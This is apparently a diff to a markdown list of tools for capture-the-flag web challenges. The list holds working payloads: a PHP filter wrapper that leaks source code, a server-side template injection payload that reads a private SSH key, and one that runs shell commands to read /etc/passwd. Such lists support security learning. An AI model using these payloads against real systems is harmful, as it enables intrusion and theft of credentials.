@@ -44,7 +44,7 @@ _Tools used for solving Web challenges_
 - [OWASP ZAP](https://www.owasp.org/index.php/Projects/OWASP_Zed_Attack_Proxy_Project)  - Intercepting proxy to replay, debug, and fuzz HTTP requests and responses.
 - [php filter] - err=php://filter/convert.base64-encode/resource=index.php
 - [SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#basic-injection) 	- SSTI Repository
-- - [Read File] {{ ''.__class__.__mro__[2].__subclasses__()[40]()('/home/test/.ssh/id_rsa').read()}}
+- - [Read File] {{ ''.__class__.__mro__[2].__subclasses__()[40]\()('/home/test/.ssh/id_rsa').read()}}
 - - [RCE] {{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
 - [Tplmap](https://github.com/epinna/tplmap) - Tplmap assists the exploitation of Code Injection and Server-Side Template Injection vulnerabilities
 
